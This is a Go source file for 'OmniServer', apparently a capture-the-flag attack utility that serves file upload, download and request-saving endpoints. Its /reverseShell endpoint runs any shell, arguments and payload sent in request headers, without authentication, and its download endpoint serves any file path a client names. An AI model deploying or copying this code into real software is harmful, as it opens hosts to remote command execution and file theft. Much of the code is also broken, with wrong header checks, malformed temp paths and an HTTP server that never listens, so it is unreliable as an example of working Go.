package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"mime"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Compile prepreprocessor to prevent use log gostd

type ctxKey struct{}

func downloadFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var requestedFile string
		wd, err := os.Getwd()
		checkError(err, 0, 0)
		if r.Method != http.MethodGet {
			writerRespondError(w, "METHOD_NOT_ALLOWED", http.StatusMethodNotAllowed)
			err := fmt.Errorf("incorrect method used %s", r.Method)
			checkError(err, 0, 0)
			return
		}
		r.Header.Add("File", "")

		if r.Header.Get("File") != "" {
			requestedFile = r.Header.Get("File")
		} else {
			err := fmt.Errorf("empty file header from %s", r.RemoteAddr)
			checkError(err, 0, 0)
		}
		pathToRequestedFile := wd + requestedFile
		exists, err := checkFileExists(pathToRequestedFile)
		checkError(err, 0, 0)
		if !exists {
			http.NotFound(w, r)
			defer InfoLogger.Printf("Failed to Download file: %v - requested by: %v\n", requestedFile, r.RemoteAddr)
		} else {
			fmt.Printf("Update to go 1.22!")
			http.ServeFile(w, r, pathToRequestedFile)
			//http.ServerFileFS(w, r, http.FileSystem, pathToRequestedFile)
			defer InfoLogger.Printf("Downloading file at: %v - requested by: %v\n", requestedFile, r.RemoteAddr)
		}
		InfoLogger.Printf("Successfully Downloaded File - %v by %v\n", requestedFile, r.RemoteAddr)
	})
}

func lsTmpDir() {
	tmpDir := os.TempDir()
	output, err := os.ReadDir(tmpDir)
	checkError(err, 0, 0)
	InfoLogger.Printf("The contents of the host system's temporary directory: %s", output)
}

func sha256AFile(filepath string) (result string, err error) {
	os := runtime.GOOS
	switch os {
	case "windows":
		cmd := exec.Command("certutil.exe", "-hashfile", filepath, "SHA256")
		output, err := cmd.CombinedOutput()
		checkError(err, 0, 0)
		outputAsString := string(output)
		outputSlice := strings.Split(outputAsString, "\n")
		result = outputSlice[1]
	case "linux":
		cmd := exec.Command("sha256sum", "", filepath)
		output, err := cmd.CombinedOutput()
		checkError(err, 0, 0)
		outputAsString := string(output)
		outputSlice := strings.Split(outputAsString, " ")
		result = outputSlice[0]
	default:
		err := fmt.Errorf("the local os %s is unsupported for hashing files with sha256", os)
		checkError(err, 0, 0)
	}
	return result, nil
}

func reverseShellHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var shell, args, payload string
		if r.Method != http.MethodPost {
			writerRespondError(w, "METHOD_NOT_ALLOWED", http.StatusMethodNotAllowed)
			err := fmt.Errorf("incorrect method used %s by %s", r.Method, r.RemoteAddr)
			checkError(err, 0, 0)
			return
		}

		r.Header.Add("Shell", "")
		r.Header.Add("Args", "")
		r.Header.Add("Payload", "")

		if r.Header.Get("Shell") != "" {
			shell = r.Header.Get("Shell")
		} else {
			err := fmt.Errorf("empty shell header from %s", r.RemoteAddr)
			checkError(err, 0, 0)
		}
		if r.Header.Get("File") != "" {
			args = r.Header.Get("Args")
		} else {
			err := fmt.Errorf("empty args header from %s", r.RemoteAddr)
			checkError(err, 0, 0)
		}
		if r.Header.Get("File") != "" {
			payload = r.Header.Get("Payload")
		} else {
			err := fmt.Errorf("empty payload header from %s", r.RemoteAddr)
			checkError(err, 0, 0)
		}
		err := reverseShell(shell, args, payload, r.RemoteAddr)
		checkError(err, 0, 0)
	})
}

func reverseShell(shell, args, payload, remoteAddr string) (err error) {
	os := runtime.GOOS
	switch os {
	case "windows":
		cmd := exec.Command(shell, args, payload)
		err := cmd.Run()
		checkError(err, 0, 0)
		return nil
	case "linux":
		cmd := exec.Command(shell, args, payload)
		err := cmd.Run()
		checkError(err, 0, 0)
		return nil
	default:
		err := fmt.Errorf("the provided shell: %s ---- args: %s ---- payload: %s ---- were provided by %s incorrectly in some way", shell, args, payload, remoteAddr)
		checkError(err, 0, 0)
	}
	return err
}

// TODO - Thinking about errors
func uploadFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var maxUploadSize int64 = 10 * 1024 // 10 Mb
		tmpDir := os.TempDir()
		wd, err := os.Getwd()
		checkError(err, 0, 0)
		http.FileServer(http.Dir(tmpDir))
		InfoLogger.Printf("Temporary File server started at %s for uploading files\n", tmpDir)

		if r.Method != http.MethodPost {
			writerRespondError(w, "METHOD_NOT_ALLOWED", http.StatusMethodNotAllowed)
			err := fmt.Errorf("incorrect method used %s from %s ", r.Method, r.RemoteAddr)
			checkError(err, 0, 0)
			return
		}

		file, fileHeader, err := r.FormFile("filename")
		checkError(err, 0, 0)
		InfoLogger.Printf("upload requested by %s\n", r.RemoteAddr)
		defer file.Close()

		fileSize := fileHeader.Size
		InfoLogger.Printf("File size (bytes): %v\n", fileSize)
		if fileSize > maxUploadSize {
			writerRespondError(w, "FILE_TOO_LARGE", http.StatusBadRequest)
		}

		fileBytes, err := io.ReadAll(file)
		checkError(err, 0, 0)

		detectedFileType := http.DetectContentType(fileBytes)
		switch detectedFileType {
		case "/", "":
			InfoLogger.Printf("No file type detected by Go STDLIB http.DetectContentType - first 512 bytes parsed")
			InfoLogger.Printf("This section is here in case of modification based of requiring specific file types")
		default:
			InfoLogger.Printf("The detected file type by OmniServer's use of go's http.DetectContentType was: %s", detectedFileType)
			writerRespondError(w, "INVALID_FILE_TYPE", http.StatusBadRequest)
		}

		fileEndings, err := mime.ExtensionsByType(detectedFileType)
		if err != nil {
			InfoLogger.Printf("mime.ExtensionsByType() cannot read %s", fileEndings)
			writerRespondError(w, "CANT_READ_FILE_TYPE", http.StatusInternalServerError)
		}
		InfoLogger.Printf("FileType: %s, File: %s\n", detectedFileType, fileHeader.Filename)
		if err := r.ParseMultipartForm(maxUploadSize); err != nil {
			InfoLogger.Printf("Could not parse multipart form: %v\n", err)
			writerRespondError(w, "CANT_PARSE_FORM", http.StatusInternalServerError) // DO I want to send errors out - compile flags!
		}
		InfoLogger.Printf("File upload request successfully made by: \n")
		InfoLogger.Printf("Uploaded File: %+v\n", fileHeader.Filename)
		InfoLogger.Printf("File Size: %+v\n", fileSize)
		InfoLogger.Printf("MIME Header: %+v\n", fileEndings)

		// Create a temporary file tmp directory that conforms to a naming scheme
		InfoLogger.Printf("File upload to temporary file creation started\n")
		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
		checkError(err, 0, 0)
		defer tempFile.Close()
		defer os.Remove(tempFile.Name())
		InfoLogger.Printf("Successfully uploaded file as a temporary file to %s - %s \n", tmpDir, tempFile.Name())

		// Reasons for writing to another file is that we can then can byte parser code here to parse the file for something CTFy...
		// sha256 hashing for the file also adds a layer of checks regarding packet skull hole-pokery that prevent worms to prevent file compromise
		InfoLogger.Printf("Attempting to SHA256 hash the file %s/%s and store it the currect working directory of OmniServer - %s \n", tmpDir, tempFile.Name(), wd)
		currTmpFile := tmpDir + tempFile.Name()
		fileBytes, err = os.ReadFile(currTmpFile)
		checkError(err, 0, 0)
		hashedFilename, err := sha256AFile(currTmpFile) //
		checkError(err, 0, 0)
		InfoLogger.Printf("Successfully hashed %s as %s\n", tempFile.Name(), hashedFilename)
		InfoLogger.Printf("Coverting from temporary to regular File - %s to %s - a SHA256\n", tempFile.Name(), hashedFilename)
		wdAndFilename := wd + hashedFilename
		err = os.WriteFile(wdAndFilename, fileBytes, 0611)
		checkError(err, 0, 0)
		exists, err := checkFileExists(wdAndFilename)
		checkError(err, 0, 0)
		if !exists {
			err := fmt.Errorf("uploaded file does not exist in the work directory as filepath %s", wdAndFilename)
			checkError(err, 0, 0)
		}
		defer InfoLogger.Printf("Successfully saved uploaded temporary file: %s to %s\n", currTmpFile, wdAndFilename)
		defer InfoLogger.Printf("Successfully removed temporary file: %s\n", currTmpFile)
		defer lsTmpDir()
	})
}

func saveReqBodyFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			writerRespondError(w, "METHOD_NOT_ALLOWED", http.StatusMethodNotAllowed)
			err := fmt.Errorf("incorrect method used %s by %s", r.Method, r.RemoteAddr)
			checkError(err, 0, 0)
			return
		}
		tmpDir := os.TempDir()
		http.FileServer(http.Dir(tmpDir))
		InfoLogger.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
		r.Body = http.MaxBytesReader(w, r.Body, 1048576)
		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
		checkError(err, 0, 0)
		defer tempFile.Close()
		defer os.Remove(tempFile.Name())
		InfoLogger.Printf("Successfully Saved Request Body to File - %s \n", tempFile.Name())
		fullTempFilePath := tmpDir + tempFile.Name()
		hashedFilename, err := sha256AFile(fullTempFilePath)
		checkError(err, 0, 0)
		wd, err := os.Getwd()
		checkError(err, 0, 0)
		fullPathWithExt := wd + hashedFilename + ".req"
		checkError(err, 0, 0)
		fileBytes, err := os.ReadFile(fullTempFilePath)
		checkError(err, 0, 0)
		err = os.WriteFile(fullPathWithExt, fileBytes, 0611)
		checkError(err, 0, 0)
		defer InfoLogger.Printf("Saved Request Body to a finalize hashed filename at %s\n", fullPathWithExt)
	})
}

func createDefaultWebServerMux() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/upload", uploadFileHandler())
	mux.HandleFunc("/download", downloadFileHandler())
	mux.HandleFunc("/saveReqBody", saveReqBodyFileHandler())
	mux.HandleFunc("/reverseShell", reverseShellHandler())
	return mux
}

func initServerContext(lportString, serverAddr string) (*http.Server, context.Context, context.CancelFunc, error) {
	ctx, cancelCtx := context.WithCancel(context.Background())
	server := &http.Server{
		Addr:    serverAddr + prependColonToPortNumber(lportString),
		Handler: createDefaultWebServerMux(),
		BaseContext: func(l net.Listener) context.Context {
			ctx = context.WithValue(ctx, ctxKey{}, lportString)
			return ctx
		},
	}
	return server, ctx, cancelCtx, nil
}

func trimFilePath(path string) (result string, err error) {
	os := runtime.GOOS
	switch os {
	case "windows":
		pathSlice := strings.SplitAfterN(path, "\\", -1)
		result = pathSlice[len(pathSlice)-1]
	case "linux":
		pathSlice := strings.SplitAfterN(path, "/", -1)
		result = pathSlice[len(pathSlice)-1]
	default:
		err := fmt.Errorf("unsupported os for filepath trimming of delimited %s", os)
		checkError(err, 0, 0)
		return "", err
	}
	return result, err
}

func validateTLS(args string) (string, string, error) {
	InfoLogger.Printf("Attempt to validate TLS arguments %s\n", args)
	var tlsCert, tlsKey, certPath, keyPath string
	os := runtime.GOOS
	argsSlice := strings.SplitAfter(args, ",")
	for i, arg := range argsSlice {
		if strings.Contains(arg, ".key") {
			keyPath = arg
			certPath = argsSlice[i-1]
		}
	}

	if keyPath == "" {
		err := fmt.Errorf("no private key file in user provided args: %s", args)
		checkError(err, 0, 0)
		return "", "", err
	}
	if certPath == "" {
		err := fmt.Errorf("assignment of private key and some certificate file not found in args: %s", args)
		checkError(err, 0, 0)
		return "", "", err
	}

	keyExists, err := checkFileExists(keyPath)
	checkError(err, 0, 0)
	certExists, err := checkFileExists(certPath)
	checkError(err, 0, 0)
	keyAndCertExist := keyExists && certExists
	if !keyAndCertExist {
		err := fmt.Errorf("either private key or certificate does not exist on the file system")
		checkError(err, 0, 0)
		return "", "", err
	}
	tlsKey, err = trimFilePath(keyPath)
	checkError(err, 0, 0)

	switch os {
	case "windows":
		tlsCert, err = trimFilePath(certPath)
		checkError(err, 0, 0)
		if !(strings.Contains(tlsCert, ".cer") || strings.Contains(tlsCert, ".pem")) {
			err := fmt.Errorf("invalid certificate file extension %s for os: %s", tlsCert, os)
			checkError(err, 0, 0)
			return "", "", err
		}
	case "linux":
		tlsCert, err = trimFilePath(certPath)
		checkError(err, 0, 0)
		if !(strings.Contains(tlsCert, ".crt") || strings.Contains(tlsCert, ".pem")) {
			err := fmt.Errorf("invalid certificate file extension %s for os: %s", tlsCert, os)
			checkError(err, 0, 0)
			return "", "", err
		}
	default:
		err := fmt.Errorf("invalid certificate arguments provided - no .crt,.pem or .cer found: %s", args)
		checkError(err, 0, 0)
		return "", "", err
	}

	return tlsCert, tlsKey, nil
}

func gracefulExit(server *http.Server, context context.Context, cancel context.CancelFunc) error {
	fmt.Printf("SIG THIS or something fanciy please with: %+v, %+v, %+v\n", server, context, cancel)
	InfoLogger.Printf("attempt to graceful shutdown server: %+v", server)
	cancel()
	<-context.Done()
	// ServerTerminationTime := time.Now()

	return nil
}

func prependColonToPortNumber(port string) string {
	builder := strings.Builder{}
	builder.WriteString(":" + port)
	listeningPort := builder.String()
	builder.Reset()
	return listeningPort
}

func checkError(err error, errorLevel, errorCode int) {
	switch errorLevel {
	case 0:
		WarningLogger.Printf("error code %v:%s", errorCode, err)
		return
	case 1:
		ErrorLogger.Printf("error code %v:%s", errorCode, err)
		log.Fatal(err)
	}
}

// renderError factorisation from - https://github.com/zupzup/golang-http-file-upload-download/blob/main/main.go
func writerRespondError(w http.ResponseWriter, message string, statusCode int) {
	w.WriteHeader(statusCode)
	w.Write([]byte(message))
}

// TODO This is not connected to the design - fix
func checkFileExists(path string) (bool, error) {
	_, err := os.Stat(path)
	checkError(err, 0, 0)
	if os.IsNotExist(err) {
		checkError(err, 0, 0)
		return false, err
	}
	return true, nil
}

func checkValidPort(portStr string) bool {
	portInt, err := strconv.Atoi(strings.ReplaceAll(portStr, ":", ""))
	checkError(err, 0, 0)
	if portInt <= 65535 && portInt > -1 {
		return true
	}
	return false
}

func checkValidIP(ip string) bool {
	if ip == "" {
		return false
	}
	checkIP := strings.Split(ip, ".")
	if len(checkIP) != 4 {
		return false
	}
	for _, ip := range checkIP {
		if octet, err := strconv.Atoi(ip); err != nil {
			return false
		} else if octet < 0 || octet > 255 {
			return false
		}
	}
	return true
}

func convIfconfigNameToCIDR(ifconfig *net.Interface) (string, error) {
	addrs, err := ifconfig.Addrs()
	checkError(err, 0, 0)
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			return ipNet.String(), nil
		}
	}
	return "", fmt.Errorf("no suitable ipv4 address found")
}

func removeFlagsAndBinFromArgs(hashDelimitedArgs string) string {
	binRegex := regexp.MustCompile(`#.[\/]OmniServer#`) // This is just for CTFs please :)
	flagsRegex := regexp.MustCompile(`-\w{1}#`)
	rmBinRegexStr := binRegex.ReplaceAllString(hashDelimitedArgs, "")
	result := flagsRegex.ReplaceAllString(rmBinRegexStr, "")
	return result
}

// Validates and sorts Args to serverType, interfaceName, interfaceCIDR(retrived by this application), IP, Port, TLS
func handleArgs(args []string) ([]string, error) {
	hashDelimitedArgs := "#" + strings.Join(args, "#") + "#"
	regexSafeArgs := "#" + removeFlagsAndBinFromArgs(hashDelimitedArgs)
	httpRegex := regexp.MustCompile(`http#`)
	httpsRegex := regexp.MustCompile(`https#`)
	ipRegex := regexp.MustCompile(`\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#`)
	portRegex := regexp.MustCompile(`\d{1,5}#`)
	tlsRegex := regexp.MustCompile(`(?:(?:[\w\d\s]:)?[\\/][^\\/]*)*\.[a-zA-Z]{3},(?:(?:[\w\d\s]:)?[\\/][^\\/]*)*\.[a-zA-Z]{3}#`)
	sortedArgs := make([]string, len(args))

	matchInterface := false
	matchIP, err := regexp.MatchString(ipRegex.String(), regexSafeArgs)
	checkError(err, 0, 0)
	matchPort, err := regexp.MatchString(portRegex.String(), regexSafeArgs)
	checkError(err, 0, 0)

	if len(args) != 11 {
		matchHTTP, err := regexp.MatchString(httpRegex.String(), regexSafeArgs)
		checkError(err, 0, 0)
		interfaces, err := net.Interfaces()
		checkError(err, 0, 0)

		tmpReduced := httpRegex.ReplaceAllString(regexSafeArgs, "")
		tmpReduced = ipRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = portRegex.ReplaceAllString(tmpReduced, "")
		interfaceArg := strings.ReplaceAll(tmpReduced, "#", "")
		fmt.Println(interfaceArg)
		for _, i := range interfaces {
			if i.Name == interfaceArg {
				matchInterface = true
			}
		}
		if !matchInterface {
			err := fmt.Errorf("there is no interface named: %s", interfaceArg)
			checkError(err, 0, 0)
		}
		ifconfig, err := net.InterfaceByName(interfaceArg)
		checkError(err, 0, 0)
		ifconfigCIDRTmp, err := convIfconfigNameToCIDR(ifconfig)
		checkError(err, 0, 0)
		httpAllMatched := matchHTTP && matchIP && matchPort
		if !httpAllMatched {
			err := fmt.Errorf("arguments provided are %v: %v", httpAllMatched, args)
			return nil, err
		}
		sortedArgs[0] = strings.ReplaceAll(strings.Join(httpRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[1] = interfaceArg
		sortedArgs[2] = ifconfigCIDRTmp
		sortedArgs[3] = strings.ReplaceAll(strings.Join(ipRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[4] = strings.ReplaceAll(strings.Join(portRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")

		if !(checkValidIP(sortedArgs[3]) && checkValidPort(sortedArgs[4])) {
			err := fmt.Errorf("invalid ip and port combination: %s and %s", sortedArgs[3], sortedArgs[4])
			return nil, err
		}
		checkError(err, 0, 0)
		return sortedArgs, nil

	} else {
		matchHTTPS, err := regexp.MatchString(httpsRegex.String(), regexSafeArgs)
		checkError(err, 0, 0)
		interfaces, err := net.Interfaces()
		checkError(err, 0, 0)
		tmpReduced := httpRegex.ReplaceAllString(regexSafeArgs, "")
		tmpReduced = ipRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = portRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = tlsRegex.ReplaceAllString(tmpReduced, "")
		interfaceArg := strings.ReplaceAll(tmpReduced, "#", "")
		for _, i := range interfaces {
			if i.Name == interfaceArg {
				matchInterface = true
			}
		}
		if !matchInterface {
			err := fmt.Errorf("there is no interface named: %s", interfaceArg)
			checkError(err, 0, 0)
		}
		ifconfig, err := net.InterfaceByName(interfaceArg)
		checkError(err, 0, 0)
		ifconfigCIDRTmp, err := convIfconfigNameToCIDR(ifconfig)
		checkError(err, 0, 0)
		matchTLS, err := regexp.MatchString(tlsRegex.String(), regexSafeArgs)
		checkError(err, 0, 0)
		httpsAllMatched := matchHTTPS && matchIP && matchPort && matchTLS && matchInterface
		if !httpsAllMatched {
			err := fmt.Errorf("arguments provided are %v: %v", httpsAllMatched, args)
			return nil, err
		}
		sortedArgs[0] = strings.ReplaceAll(strings.Join(httpRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[1] = interfaceArg
		sortedArgs[2] = ifconfigCIDRTmp
		sortedArgs[3] = strings.ReplaceAll(strings.Join(ipRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[4] = strings.ReplaceAll(strings.Join(portRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[5] = strings.ReplaceAll(strings.Join(tlsRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		if !(checkValidIP(sortedArgs[3]) && checkValidPort(sortedArgs[4])) {
			err := fmt.Errorf("invalid ip and port combination: %s and %s", sortedArgs[3], sortedArgs[4])
			return nil, err
		}
		checkError(err, 0, 0)
		return sortedArgs, nil
	}
}

func printBanner() {
	fmt.Printf("Flashy nice colorful banner with lots of 💀s")
	fmt.Printf("Beware this program uses http.ServeFileFS() visit https://pkg.go.dev/net/http#ServeFileFS - meaning that ANY file can be downloaded if requested and exists\n")
	fmt.Printf("💀 ...This Program is for CTFs - Happy Hacking :) ... 💀")
}

func printTotalRuntime(appStartTime time.Time) {
	appTerminateTime := time.Now()
	totalRuntime := 0
	// Do the mathematics idiot
	InfoLogger.Printf("Application started: %v - Terminated: %v - Runtime: %v\n", appStartTime, appTerminateTime, totalRuntime)
}

var InfoLogger, WarningLogger, ErrorLogger *log.Logger

func main() {
	printBanner()
	var ipAddress, serverType, tlsInputStr, netInterface string
	var portInt int
	flag.StringVar(&tlsInputStr, "t", "None", "Provide TLS information delimited by a comma - requires server type: -s https")
	flag.StringVar(&serverType, "s", "http", "Provide a server of type: http, https")
	flag.StringVar(&netInterface, "e", "lo", "Provide a Network Interface - required!")
	flag.StringVar(&ipAddress, "i", "127.0.0.1", "Provide a valid IPv4 address - required!")
	flag.IntVar(&portInt, "p", 8443, "Provide a TCP port number - required!")
	flag.Parse()

	appStartTime := time.Now().UTC()
	args, argsLen := os.Args, len(os.Args)

	dateFormatted := appStartTime.Format("2006-01-01")
	nameBuilder := strings.Builder{}
	nameBuilder.WriteString(dateFormatted)
	nameBuilder.WriteString(".log")
	file, err := os.OpenFile(nameBuilder.String(), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0661)
	checkError(err, 0, 0)

	InfoLogger = log.New(file, "INFO: ", log.Ldate|log.Ltime|log.Lshortfile)
	WarningLogger = log.New(file, "WARNING: ", log.Ldate|log.Ltime|log.Lshortfile)
	ErrorLogger = log.New(file, "ERROR: ", log.Ldate|log.Ltime|log.Lshortfile)

	// Would it not be nice given my long term openssl syntax memory to just print the instructions for creating certs on each system
	// https://gist.github.com/denji/12b3a568f092ab951456
	// Add -T (print certificate commands), -h and -v

	if argsLen > 9 {
		flag.PrintDefaults()
		fmt.Println()
		err := fmt.Errorf("the number arguments provided was %d", argsLen)
		checkError(err, 0, 0)
		os.Exit(1)
	}

	sortedArgs, err := handleArgs(args)
	checkError(err, 0, 0)

	switch sortedArgs[0] {
	case "http":
		InfoLogger.Printf("--- Building HTTP Server ---\n")
		httpServer, ctx, cancelCtx, err := initServerContext(sortedArgs[4], sortedArgs[3])
		checkError(err, 0, 0)
		InfoLogger.Printf("--- Server Built for %v created ---\n", httpServer)
		checkError(err, 0, 0)
		err = gracefulExit(httpServer, ctx, cancelCtx)
		checkError(err, 0, 0)
	case "https":
		tlsCert, tlsKey, err := validateTLS(sortedArgs[5])
		checkError(err, 0, 0)
		InfoLogger.Printf("--- Building HTTPS Server ---\n")
		httpsServer, ctx, cancelCtx, err := initServerContext(sortedArgs[4], sortedArgs[3])
		checkError(err, 0, 0)
		cfg := &tls.Config{
			MinVersion:               tls.VersionTLS12,
			CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
			PreferServerCipherSuites: true,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
				tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_RSA_WITH_AES_256_CBC_SHA,
			},
		}

		httpsServer.TLSConfig = cfg
		httpsServer.TLSNextProto = make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0)
		InfoLogger.Printf("--- Server Built for %v created ---\n", httpsServer)
		httpsServer.ListenAndServeTLS(tlsCert, tlsKey)
		err = gracefulExit(httpsServer, ctx, cancelCtx)
		checkError(err, 0, 0)
	default:
		err := fmt.Errorf("invalid sorted arguments and proof at index 0: %s", sortedArgs[0])
		checkError(err, 0, 0)
	}

	printTotalRuntime(appStartTime)
	os.Exit(0)
}
